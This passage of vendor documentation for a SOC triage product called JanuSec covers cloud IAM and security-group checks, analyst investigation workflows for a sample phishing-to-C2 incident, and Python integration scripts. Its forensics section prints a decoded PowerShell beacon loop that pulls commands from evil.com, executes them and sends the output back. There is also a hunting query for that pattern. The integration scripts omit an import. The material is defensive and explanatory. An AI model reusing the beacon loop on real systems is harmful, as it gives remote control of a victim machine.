    {"id": "AKIA...", "user": "analyst", "last_used": "2025-10-27", "mfa": true}
  ],
  "policies": [
    {"name": "AdminPolicy", "actions": ["*"], "resources": ["*"], "attached_to": ["admin"]}
  ]
}

Risk Detection:
1. Keys without MFA:
   ├─ AKIA... (admin) → No MFA → HIGH risk
   └─ Factor: iam:key_no_mfa

2. Unused keys (>90 days):
   ├─ AKIA... (admin) → Last used 88 days ago → MEDIUM risk
   └─ Factor: iam:key_unused_90d

3. Wildcard policies:
   ├─ AdminPolicy: actions=["*"], resources=["*"] → CRITICAL risk
   └─ Factor: iam:overpriv_wildcard

4. Admins without MFA:
   ├─ admin@company.com → No MFA + admin role → CRITICAL risk
   └─ Factor: iam:admin_no_mfa

API Response:
{
  "keys_without_mfa": 1,
  "unused_keys": 0,
  "wildcard_policies": 1,
  "admin_no_mfa": 1,
  "violating_keys_no_mfa": [{"user": "admin", "id": "AKIA..."}],
  "violating_wildcard_policies": [{"name": "AdminPolicy", "attached_to": ["admin"]}],
  "top_findings": [
    {"type": "iam:admin_no_mfa", "count": 1},
    {"type": "iam:overpriv_wildcard", "count": 1},
    {"type": "iam:key_no_mfa", "count": 1}
  ]
}

───────────────────────────────────────────────────────────────────────────────

STEP 5: SECURITY GROUP DRIFT TRACKING
═══════════════════════════════════════════════════════════════════════════════
API: POST /api/v1/compliance/net/sg/audit

Drift Event:
{
  "sg_id": "sg-12345",
  "change": "added",
  "rule": {
    "cidr": "0.0.0.0/0",
    "port": 22,
    "protocol": "tcp"
  },
  "reason": "manual_change_by_admin"
}

Drift Detection:
├─ Change: "added" → New rule
├─ CIDR: "0.0.0.0/0" → Open to world
├─ Port: 22 → SSH
└─ Verdict: CRITICAL (SSH open to internet)

Factor: cloud:sg_open_0_0_0_0
MITRE: T1595.001 (Active Scanning: Scanning IP Blocks), T1046 (Network Service Discovery)
STRIDE: Information Disclosure, Discovery

Prometheus Metrics:
sg_drift_events_total{tenant="acme_corp", change="added"}.inc()
sg_open_to_world_total{tenant="acme_corp"}.inc()

API Response:
{
  "total_events": 45,
  "added_rules": 12,
  "removed_rules": 33,
  "open_to_world_count": 3,
  "by_sg": [
    {
      "sg_id": "sg-12345",
      "added": 1,
      "removed": 0,
      "open_to_world": true
    }
  ]
}

───────────────────────────────────────────────────────────────────────────────

STEP 6: SOAR REMEDIATION
═══════════════════════════════════════════════════════════════════════════════
Endpoints:
├─ POST /api/v1/soar/remediate/iam/disable-key
├─ POST /api/v1/soar/remediate/iam/enforce-mfa
└─ POST /api/v1/soar/remediate/net/sg-tighten

Example: Disable IAM Key
Request:
{
  "key_id": "AKIA...",
  "dry_run": false,  # Execute real action
  "tenant_id": "acme_corp"
}

Playbook Execution:
1. Validate: Key exists and is active
2. Audit: Log action intent
3. Execute: AWS SDK call → boto3.client('iam').update_access_key(Status='Inactive')
4. Verify: Confirm key disabled
5. Notify: Slack/PagerDuty alert

Response:
{
  "status": "executed",
  "key_id": "AKIA...",
  "action": "aws iam update-access-key --access-key-id AKIA... --status Inactive",
  "execution_time_ms": 234,
  "audit_trail_id": "audit_12345"
}

───────────────────────────────────────────────────────────────────────────────

STEP 7: CLOUD CROSSMAP (Pipeline Integration)
═══════════════════════════════════════════════════════════════════════════════
API: GET /api/v1/compliance/cloud/crossmap

Maps cloud findings → Pipeline factors → Graph provenance

Example:
Finding: cloud:public_bucket (S3 bucket with public read)
├─ Pipeline Factors: ['data_exfil_risk', 'compliance_s3_exposure']
├─ MITRE: T1530 (Data from Cloud Storage)
├─ Hopgraph Edges: [bucket → internet, bucket → user]
├─ Risk Score: 7.8/10
└─ Remediation: "Enable S3 Block Public Access + bucket policy deny"

Finding: cloud:sg_open_0_0_0_0 (Security group open to world)
├─ Pipeline Factors: ['net:sg_open_world', 'compliance_sg_violation']
├─ MITRE: T1595.001 (Active Scanning), T1046 (Network Service Discovery)
├─ Hopgraph Edges: [ec2 → 0.0.0.0/0]
├─ Risk Score: 8.2/10
└─ Remediation: "Restrict SG to specific CIDR ranges (least privilege)"

Response:
{
  "cloud:public_bucket": {
    "pipeline_factors": ["data_exfil_risk", "compliance_s3_exposure"],
    "mitre_techniques": ["T1530"],
    "hopgraph_edges": ["bucket->internet", "bucket->user"],
    "risk_score": 7.8,
    "remediation": "Enable S3 Block Public Access"
  },
  "cloud:sg_open_0_0_0_0": {
    "pipeline_factors": ["net:sg_open_world", "compliance_sg_violation"],
    "mitre_techniques": ["T1595.001", "T1046"],
    "hopgraph_edges": ["ec2->0.0.0.0/0"],
    "risk_score": 8.2,
    "remediation": "Restrict SG to specific CIDR ranges"
  }
}
```

---

## Complete User Flows by Skill Level

### L1 Analyst Flow (Junior - First 6 Months)

**Profile:**
- Experience: 0-6 months in SOC
- Skills: Basic networking, Windows/Linux fundamentals
- Goal: Clear go/no-go decisions, minimal overwhelm

**Daily Workflow:**

```
08:00 AM - Login to JanuSec Console
├─ Dashboard shows: 23 alerts pending review (down from 450 raw SIEM alerts)
├─ Filter: "High Confidence" (confidence ≥ 0.85)
└─ Result: 8 alerts requiring immediate attention

08:05 AM - Review Alert #1
┌────────────────────────────────────────────────────────────────┐
│ Alert: Suspicious PowerShell Activity                          │
│ Verdict: MALICIOUS (High Confidence)                           │
│ Host: workstation-42                                            │
│ User: john.doe@company.com                                      │
│                                                                 │
│ What Happened:                                                  │
│ • Outlook opened a suspicious attachment                        │
│ • PowerShell launched with encoded command                      │
│ • Connection to unknown domain detected                         │
│                                                                 │
│ Why It's Malicious:                                             │
│ • Known malware pattern detected                                │
│ • Command & Control behavior (beaconing)                        │
│ • Host has unpatched vulnerability (CVE-2024-1234)             │
│                                                                 │
│ What To Do:                                                     │
│ [ESCALATE TO L2 IMMEDIATELY]  [MARK FALSE POSITIVE]            │
└────────────────────────────────────────────────────────────────┘

Action: Click "ESCALATE TO L2 IMMEDIATELY"
├─ Ticket created in SOAR
├─ L2 analyst notified via Slack
├─ Alert moved to "Escalated" queue
└─ L1 moves to next alert

08:10 AM - Review Alert #2
┌────────────────────────────────────────────────────────────────┐
│ Alert: Unusual Login Location                                  │
│ Verdict: SUSPICIOUS (Medium Confidence)                        │
│ User: admin@company.com                                         │
│ Location: New York → London (5 min apart)                      │
│                                                                 │
│ What Happened:                                                  │
│ • User logged in from New York at 08:00 AM                     │
│ • Same user logged in from London at 08:05 AM                  │
│ • Impossible travel time (5 minutes)                            │
│                                                                 │
│ Why It's Suspicious:                                            │
│ • Geo-velocity anomaly detected                                 │
│ • Could be stolen credentials                                   │
│                                                                 │
│ What To Do:                                                     │
│ [ESCALATE TO L2]  [MARK FALSE POSITIVE]  [MORE INFO]           │
└────────────────────────────────────────────────────────────────┘

Action: Click "MORE INFO"
├─ Expands to show: User uses VPN (London endpoint)
├─ Context: VPN reconnection caused dual login
├─ Verdict: Likely FALSE POSITIVE
└─ Action: Click "MARK FALSE POSITIVE" + Comment: "VPN reconnection"

Feedback Loop:
├─ JanuSec learns: geo-velocity + known VPN = benign
├─ Future similar alerts: Auto-classified as benign
└─ L1 workload reduced

08:15 AM - Review Remaining 6 Alerts
├─ 3 alerts: Escalated to L2 (malicious)
├─ 2 alerts: Marked false positive (VPN, scheduled task)
└─ 1 alert: Queued for manual review (ambiguous)

09:00 AM - Check Escalation Status
├─ L2 analyst confirmed: Alert #1 = True positive (malware)
├─ SOAR playbook executed: workstation-42 isolated
├─ User notified: "Your device has been isolated, IT will assist"
└─ L1 closes ticket: Incident resolved

Daily Summary:
├─ Total alerts reviewed: 23
├─ Escalated to L2: 8 (35%)
├─ False positives marked: 12 (52%)
├─ Pending review: 3 (13%)
├─ Avg time per alert: 3 minutes (down from 15 minutes without JanuSec)
└─ Productivity: 8x improvement
```

### L2 Analyst Flow (Intermediate - 6-24 Months)

**Profile:**
- Experience: 6-24 months in SOC
- Skills: Threat hunting, MITRE ATT&CK, basic forensics
- Goal: Investigate suspicious activity, determine root cause

**Investigation Workflow:**

```
10:00 AM - Receive Escalation from L1
Alert: Suspicious PowerShell Activity (evt_12345)

┌────────────────────────────────────────────────────────────────┐
│ Alert: Rare Lineage + LOLBIN + C2 Beacon                       │
│ Verdict: MALICIOUS (Confidence: 0.92)                          │
│ Risk Score: 8.7/10                                             │
│                                                                 │
│ Factors (6):                                                    │
│ • rare_lineage (outlook → powershell)                          │
│ • lolbin:powershell_encoded (Base64 command)                   │
│ • net:beacon_like (60s intervals, CV=0.08)                     │
│ • domain_novel_observed (evil.com, first seen 4h ago)          │
│ • ssl:ja3_known_bad (Cobalt Strike fingerprint)                │
│ • corr:vuln_host_beacon (CVE-2024-1234, CVSS 9.8)             │
│                                                                 │
│ MITRE ATT&CK:                                                   │
│ • T1059.001 (PowerShell execution)                             │
│ • T1071.001 (Application Layer Protocol: Web)                  │
│ • T1573 (Encrypted Channel)                                    │
│                                                                 │
│ Recommended Actions:                                            │
│ 1. Isolate workstation-42 from network (HIGH priority)        │
│ 2. Dump process memory (powershell.exe PID 1234)               │
│ 3. Check lateral movement (last 24h)                           │
│ 4. Block evil.com at firewall                                  │
│ 5. Review all hosts with CVE-2024-1234 (12 hosts)             │
│                                                                 │
│ [INVESTIGATE] [ISOLATE HOST] [ESCALATE TO L3]                  │
└────────────────────────────────────────────────────────────────┘

10:05 AM - STEP 1: Isolate Host
Action: Click "ISOLATE HOST"
├─ SOAR playbook triggered: CrowdStrike API → Contain device
├─ Host isolated from network (localhost only)
├─ User notified: "Your device has been isolated"
└─ Confirmation: Host isolated at 10:05:23 AM

10:10 AM - STEP 2: Memory Dump
Action: Run forensic commands
├─ CrowdStrike RTR: "procdump -p 1234"
├─ Download: powershell_1234.dmp (45 MB)
└─ Upload to analysis VM

10:15 AM - STEP 3: Process Tree Analysis
Query: SIEM timeline for workstation-42 (last 24h)

Timeline:
09:30 AM - outlook.exe (PID 5678)
   └─ 10:00 AM - powershell.exe (PID 1234) ← SUSPICIOUS
      ├─ Command: powershell.exe -enc QwBvAG4AbgBlAGN...
      └─ Decoded: "Connect -Uri https://evil.com/beacon"

09:45 AM - explorer.exe (PID 9101)
   └─ 09:50 AM - notepad.exe (PID 1122) ← BENIGN

Verdict: Outlook → PowerShell is the ONLY suspicious lineage

10:20 AM - STEP 4: Network Analysis
Query: Firewall logs for workstation-42 (last 24h)

Connections:
├─ 10:00 AM - workstation-42 → evil.com (192.0.2.100:443)
│  ├─ Protocol: HTTPS
│  ├─ JA3: 769,49195-49196... (Cobalt Strike signature)
│  ├─ Beacon interval: 60s ± 3s (CV=0.08)
│  └─ Data transferred: 2.3 MB (upload, likely exfiltration)
│
└─ 10:05 AM - evil.com blocked at firewall (after isolation)

10:25 AM - STEP 5: Threat Intel Lookup
Query: VirusTotal, abuse.ch, MISP for evil.com

Results:
├─ VirusTotal: 45/90 vendors flag as malicious
├─ abuse.ch: Listed in URLhaus (Cobalt Strike C2)
├─ MISP: Associated with APT29 (Cozy Bear) campaign
└─ First seen: 2025-10-28 06:00 AM (4 hours before our alert)

10:30 AM - STEP 6: Lateral Movement Check
Query: SIEM for connections FROM workstation-42 to internal hosts

Results:
├─ 10:02 AM - workstation-42 → server-05 (SMB, port 445)
│  ├─ Account: john.doe (legitimate user)
│  ├─ Action: File access (\\server-05\share\reports.xlsx)
│  └─ Verdict: BENIGN (routine file access)
│
└─ No suspicious lateral movement detected

10:35 AM - STEP 7: Vulnerability Context
Query: SBOM inventory for CVE-2024-1234

Affected Hosts (12):
├─ workstation-42 (compromised, isolated)
├─ workstation-51, workstation-63, ... (vulnerable, not compromised)
└─ Patch status: Available (Windows KB5012345)

Recommendation: Patch all 12 hosts URGENTLY

10:40 AM - STEP 8: Root Cause Analysis
Conclusion:
├─ Initial Access: Phishing email with malicious macro (T1566.001)
├─ Execution: Macro spawned PowerShell (T1059.001)
├─ C2: PowerShell beacon to evil.com (T1071.001)
├─ Exfiltration: 2.3 MB data uploaded (T1041)
├─ Vulnerability: CVE-2024-1234 on host (likely exploited)

Attack Chain:
1. User opened phishing email (09:55 AM)
2. Macro executed in Outlook (09:58 AM)
3. Outlook spawned PowerShell (10:00 AM)
4. PowerShell established C2 beacon (10:00 AM)
5. Data exfiltration began (10:02 AM)
6. JanuSec detected and alerted (10:05 AM)
7. Host isolated (10:05 AM, 5 min MTTR)

10:45 AM - STEP 9: Escalation to L3
Decision: Escalate for deeper forensics (memory analysis, IOC extraction)

Escalation Report:
{
  "alert_id": "evt_12345",
  "analyst": "analyst_l2@company.com",
  "verdict": "CONFIRMED MALICIOUS",
  "attack_type": "Phishing → PowerShell C2 → Data Exfiltration",
  "mitre": ["T1566.001", "T1059.001", "T1071.001", "T1041"],
  "root_cause": "Phishing email, CVE-2024-1234 exploited",
  "containment": "Host isolated at 10:05 AM",
  "next_steps": "Memory forensics, IOC extraction, user training",
  "affected_hosts": 12,
  "priority": "CRITICAL"
}

11:00 AM - Case Closed (Escalated to L3)
├─ Time spent: 60 minutes (vs. 4.5 hours without JanuSec)
├─ MTTR: 5 minutes (detection → containment)
└─ Outcome: Threat contained, no lateral movement, escalated for deeper analysis
```

### L3 Analyst Flow (Expert - 2+ Years)

**Profile:**
- Experience: 2+ years in SOC, advanced certifications (GCFA, GCIH)
- Skills: Malware analysis, reverse engineering, threat intel, incident response
- Goal: Deep forensics, IOC extraction, threat hunting

**Advanced Investigation:**

```
11:00 AM - Receive Escalation from L2
Alert: evt_12345 (Confirmed malicious, host isolated)

Full Context (from L2):
├─ Attack vector: Phishing → PowerShell C2
├─ C2 domain: evil.com (192.0.2.100)
├─ JA3: Known Cobalt Strike
├─ Data exfiltrated: 2.3 MB
└─ Memory dump: powershell_1234.dmp (45 MB)

11:05 AM - STEP 1: Memory Forensics
Tool: Volatility 3 + custom plugins

Analysis:
$ vol -f powershell_1234.dmp windows.pslist
PID   Process         Threads  Handles
1234  powershell.exe  8        342

$ vol -f powershell_1234.dmp windows.cmdline
PID   Command Line
1234  powershell.exe -enc QwBvAG4AbgBlAGN0AC0AVQByAGkA...

Decoded Base64:
"Connect -Uri https://evil.com/beacon -Method POST -Headers @{
  'User-Agent'='Mozilla/5.0 (compatible; MSIE 9.0)'
  'X-Session-ID'='a3f8b2c1d4e5f6a7'
}
while($true) {
  $cmd = Invoke-RestMethod https://evil.com/tasks
  $out = Invoke-Expression $cmd
  Invoke-RestMethod https://evil.com/results -Body $out
  Start-Sleep 60
}"

Verdict: Classic C2 beacon loop (60s interval)

11:15 AM - STEP 2: Network Artifacts
Extract: SSL certificate, JA3/JA3S hashes, HTTP headers

Certificate (evil.com):
├─ Subject: CN=*.cloudapp.net (self-signed)
├─ Issuer: Let's Encrypt Fake CA
├─ Valid: 2025-10-27 to 2025-11-27 (30 days)
├─ SHA256: a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5...
└─ Verdict: Suspicious (self-signed, short validity)

JA3 Hash: 769,49195-49196-49199-49200-52393-52392...
├─ Match: Cobalt Strike 4.5 default profile
└─ VirusTotal: 89 vendors flag as malicious

11:25 AM - STEP 3: IOC Extraction
Indicators of Compromise:

Network:
├─ Domain: evil.com
├─ IP: 192.0.2.100
├─ JA3: 769,49195-49196...
├─ User-Agent: Mozilla/5.0 (compatible; MSIE 9.0)
└─ HTTP Header: X-Session-ID: a3f8b2c1d4e5f6a7

Host:
├─ Process: outlook.exe → powershell.exe (rare lineage)
├─ Command: powershell.exe -enc QwBvAG4AbgBlAGN...
├─ Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run (persistence check)
└─ File: C:\Users\john.doe\AppData\Local\Temp\beacon.ps1

11:35 AM - STEP 4: Threat Intel Submission
Submit IOCs to:
├─ abuse.ch (URLhaus, ThreatFox)
├─ VirusTotal (private submission)
├─ MISP (internal threat intel platform)
└─ AlienVault OTX (public sharing)

Response:
├─ evil.com: Added to URLhaus blocklist
├─ JA3: Added to ThreatFox C2 signatures
└─ Attribution: Likely APT29 (Cozy Bear) based on TTP overlap

11:45 AM - STEP 5: Threat Hunting (Proactive)
Hunt Query: Search for similar attacks across ALL hosts

SIEM Query:
```
index=windows EventCode=4688
| where ParentImage ends with "outlook.exe"
| where Image ends with "powershell.exe"
| where CommandLine contains "-enc"
| stats count by ComputerName, User, CommandLine
```

Results:
├─ workstation-42 (john.doe) → Already contained
├─ workstation-78 (jane.smith) → SUSPICIOUS (similar pattern)
└─ Action: Investigate workstation-78 (potential second victim)

12:00 PM - STEP 6: Incident Report
Generate: Executive summary + technical details

Executive Summary:
"On 2025-10-28 at 10:00 AM, a phishing attack targeted john.doe@company.com,
resulting in PowerShell C2 beacon to evil.com. 2.3 MB of data was exfiltrated.
Host was isolated within 5 minutes. No lateral movement detected. Root cause:
Unpatched CVE-2024-1234 (CVSS 9.8, KEV). 12 hosts remain vulnerable. APT29
attribution (medium confidence)."

Technical Details:
├─ MITRE ATT&CK: T1566.001 → T1059.001 → T1071.001 → T1041
├─ IOCs: evil.com, 192.0.2.100, JA3 hash, X-Session-ID
├─ Artifacts: Memory dump, network PCAP, PowerShell logs
├─ Timeline: 09:55 AM (email) → 10:00 AM (execution) → 10:05 AM (detection)
└─ Recommendations: Patch CVE-2024-1234, block evil.com, user training

12:15 PM - STEP 7: Remediation Plan
Actions:
1. Patch CVE-2024-1234 on all 12 hosts (URGENT, 4 hour SLA)
2. Block evil.com at firewall (DONE)
3. Reset john.doe credentials (DONE)
4. Re-image workstation-42 (Scheduled for 1:00 PM)
5. Investigate workstation-78 (potential second victim)
6. User training: Phishing awareness (Scheduled for next week)

12:30 PM - Case Closed
├─ Total time: 1.5 hours (vs. 8+ hours without JanuSec)
├─ Outcome: Threat neutralized, IOCs extracted, threat hunt initiated
└─ Business impact: Minimal (5 min containment, no lateral movement)
```

---

## Integration Cookbook

### Quick Start Integrations (48 Hours)

#### 1. CrowdStrike EDR

```python
# File: scripts/crowdstrike_poller.py

import requests
import time

CROWDSTRIKE_API = "https://api.crowdstrike.com"
CROWDSTRIKE_CLIENT_ID = os.getenv('CROWDSTRIKE_CLIENT_ID')
CROWDSTRIKE_CLIENT_SECRET = os.getenv('CROWDSTRIKE_CLIENT_SECRET')
JANUSEC_API = "http://janusec:8080"
JANUSEC_API_KEY = os.getenv('JANUSEC_API_KEY')

def get_crowdstrike_token():
    """Authenticate with CrowdStrike API"""
    response = requests.post(
        f"{CROWDSTRIKE_API}/oauth2/token",
        data={
            'client_id': CROWDSTRIKE_CLIENT_ID,
            'client_secret': CROWDSTRIKE_CLIENT_SECRET
        }
    )
    return response.json()['access_token']

def fetch_crowdstrike_alerts(token, since_timestamp):
    """Fetch alerts from CrowdStrike"""
    headers = {'Authorization': f'Bearer {token}'}
    response = requests.get(
        f"{CROWDSTRIKE_API}/alerts/queries/alerts/v2",
        headers=headers,
        params={'filter': f"created_timestamp:>='{since_timestamp}'"}
    )
    alert_ids = response.json()['resources']

    # Fetch alert details
    response = requests.post(
        f"{CROWDSTRIKE_API}/alerts/entities/alerts/v2",
        headers=headers,
        json={'ids': alert_ids}
    )
    return response.json()['resources']

def send_to_janusec(alert, tenant_id):
    """Send alert to JanuSec for triage"""
    headers = {
        'x-api-key': JANUSEC_API_KEY,
        'X-Tenant-ID': tenant_id,
        'Content-Type': 'application/json'
    }

    # Normalize CrowdStrike alert to JanuSec event
    event = {
        'tenant_id': tenant_id,
        'event_type': 'process_execution',
        'timestamp': alert['created_timestamp'],
        'host': alert['device']['hostname'],
        'user': alert.get('user_name'),
        'process': alert['process']['file_name'],
        'parent_process': alert['process'].get('parent_process_name'),
        'cmdline': alert['process'].get('command_line'),
        'raw_alert': alert
    }

    response = requests.post(
        f"{JANUSEC_API}/api/v1/events",
        headers=headers,
        json=event
    )
    return response.json()

# Main polling loop
def main():
    token = get_crowdstrike_token()
    last_timestamp = time.time() - 3600  # Start 1 hour ago

    while True:
        try:
            alerts = fetch_crowdstrike_alerts(token, last_timestamp)
            print(f"Fetched {len(alerts)} alerts from CrowdStrike")

            for alert in alerts:
                result = send_to_janusec(alert, tenant_id='acme_corp')
                print(f"Sent alert {alert['id']} to JanuSec: {result['verdict']}")

            last_timestamp = time.time()
            time.sleep(60)  # Poll every 60 seconds

        except Exception as e:
            print(f"Error: {e}")
            time.sleep(300)  # Wait 5 minutes on error

if __name__ == '__main__':
    main()
```

#### 2. Splunk SIEM

```python
# File: scripts/splunk_hec_forwarder.py

import requests
import json

SPLUNK_HEC_URL = "https://splunk.company.com:8088/services/collector"
SPLUNK_HEC_TOKEN = os.getenv('SPLUNK_HEC_TOKEN')

JANUSEC_API = "http://janusec:8080"
JANUSEC_API_KEY = os.getenv('JANUSEC_API_KEY')

def send_janusec_verdict_to_splunk(verdict):
    """Send JanuSec verdict back to Splunk"""

    event = {
        'time': verdict['timestamp'],
        'source': 'janusec',
        'sourcetype': 'janusec:verdict',
        'event': {
            'alert_id': verdict['alert_id'],
            'verdict': verdict['verdict'],
            'confidence': verdict['confidence'],
            'risk_score': verdict['risk_score'],
            'factors': verdict['factors'],
            'mitre': verdict['mitre'],
            'recommended_actions': verdict['recommended_actions']
        }
    }

    headers = {
        'Authorization': f'Splunk {SPLUNK_HEC_TOKEN}',
        'Content-Type': 'application/json'
    }

    response = requests.post(SPLUNK_HEC_URL, headers=headers, json=event)
    return response.json()

# Splunk alert action (triggered on notable events)
def main():
    # Read Splunk alert from stdin
    alert = json.loads(input())

    # Send to JanuSec
    headers = {
        'x-api-key': JANUSEC_API_KEY,
        'X-Tenant-ID': 'acme_corp'
    }

    event = {
        'tenant_id': 'acme_corp',
        'event_type': 'splunk_notable',
        'timestamp': alert['_time'],
        'host': alert.get('host'),
        'user': alert.get('user'),
        'raw_alert': alert
    }

    response = requests.post(
        f"{JANUSEC_API}/api/v1/events",
        headers=headers,
        json=event
    )

    verdict = response.json()

    # Send verdict back to Splunk
    send_janusec_verdict_to_splunk(verdict)

    print(f"JanuSec verdict: {verdict['verdict']} (confidence: {verdict['confidence']})")

if __name__ == '__main__':
    main()
```

#### 3. Wiz Cloud Security

```python
# File: scripts/wiz_poller.py

import requests
import time

WIZ_API = "https://api.us1.app.wiz.io/graphql"
WIZ_CLIENT_ID = os.getenv('WIZ_CLIENT_ID')
WIZ_CLIENT_SECRET = os.getenv('WIZ_CLIENT_SECRET')
JANUSEC_API = "http://janusec:8080"
JANUSEC_API_KEY = os.getenv('JANUSEC_API_KEY')

def get_wiz_token():
    """Authenticate with Wiz API"""
    response = requests.post(
        "https://auth.app.wiz.io/oauth/token",
        json={
            'audience': 'wiz-api',
            'grant_type': 'client_credentials',
            'client_id': WIZ_CLIENT_ID,
            'client_secret': WIZ_CLIENT_SECRET
        }
    )
    return response.json()['access_token']

def fetch_wiz_issues(token):
    """Fetch security issues from Wiz"""

    query = """
    query {
      issues(first: 100, filterBy: {status: [OPEN], severity: [CRITICAL, HIGH]}) {
        nodes {
          id
          type
          severity
          status
          createdAt
          resource {
            type
            name
            cloudPlatform
            region
          }
          control {
            name
            description
          }
        }
      }
    }
    """

    headers = {'Authorization': f'Bearer {token}'}
    response = requests.post(WIZ_API, headers=headers, json={'query': query})
    return response.json()['data']['issues']['nodes']

def send_to_janusec(issue, tenant_id):
    """Send Wiz issue to JanuSec CSPM triage"""

    headers = {
        'x-api-key': JANUSEC_API_KEY,
        'X-Tenant-ID': tenant_id
    }

    # Map Wiz issue type to JanuSec factor
    type_map = {
        'PUBLIC_S3_BUCKET': 'cloud:public_bucket',
        'SECURITY_GROUP_OPEN_TO_INTERNET': 'cloud:sg_open_0_0_0_0',
        'IAM_OVERPRIVILEGED_ROLE': 'iam:overpriv_wildcard',
        'IAM_KEY_WITHOUT_MFA': 'iam:key_no_mfa'
    }

    finding = {
        'id': issue['id'],
        'type': type_map.get(issue['type'], 'cloud:misconfiguration'),
        'resource': f"{issue['resource']['type']}:{issue['resource']['name']}",
        'severity': issue['severity'].lower(),
        'cloud': issue['resource']['cloudPlatform'].lower(),
        'region': issue['resource']['region']
    }

    body = {
        'tenant_id': tenant_id,
        'findings': [finding]
    }

    response = requests.post(
        f"{JANUSEC_API}/api/v1/compliance/posture",
        headers=headers,
        json=body
    )
    return response.json()

# Main polling loop
def main():
    token = get_wiz_token()

    while True:
        try:
            issues = fetch_wiz_issues(token)
            print(f"Fetched {len(issues)} issues from Wiz")

            for issue in issues:
                result = send_to_janusec(issue, tenant_id='acme_corp')
                print(f"Sent Wiz issue {issue['id']} to JanuSec: {result['factors']}")

            time.sleep(3600)  # Poll every hour

        except Exception as e:
            print(f"Error: {e}")
            time.sleep(300)

if __name__ == '__main__':
    main()
```

---

**End of Part 3**

## Summary: Complete 3-Part Series

**Part 1:** Market Positioning, USP, Data Flow Architecture (51 pages)
- Triage-as-a-Service positioning
- 4-tier AI with graceful degradation
- Non-disruptive overlay architecture
- Competitive differentiation vs. Wiz/CrowdStrike/Qualys
- Complete data flow (ingestion → pipeline → enrichment → delivery)

**Part 2:** AI Techniques Applied to Security (60 pages)
- 25 AI/ML techniques inventory
- OWASP AI/API Top 10 implementations with code
- Network threat hunting (JA3, DNS tunneling, beaconing)
- Endpoint threat hunting (LOLBIN TF-IDF, rare lineage, exec burst)

**Part 3:** Complete Feature Walkthrough & User Flows (75 pages)
- SBOM + KEV/EPSS/CVSS/Qualys/Tenable integration
- EU AI Act compliance (Articles 9-10, bias testing)
- 7 explainability frameworks (CVE/CVSS/MITRE/STRIDE/DREAD/PASTA/MAESTRO)
- Cloud Security (CSPM) with IAM risk, SG drift, SOAR remediation
- L1/L2/L3 analyst workflows with real-world examples
- Integration cookbook (CrowdStrike, Splunk, Wiz)

**Total:** 186 pages of comprehensive Triage-as-a-Service documentation

**Key Takeaway:** JanuSec is NOT a competitor—it's the AI-powered triage layer that makes your existing security stack 10x more effective by reducing false positives 70-85% and empowering analysts at all skill levels with explainable, actionable intelligence.
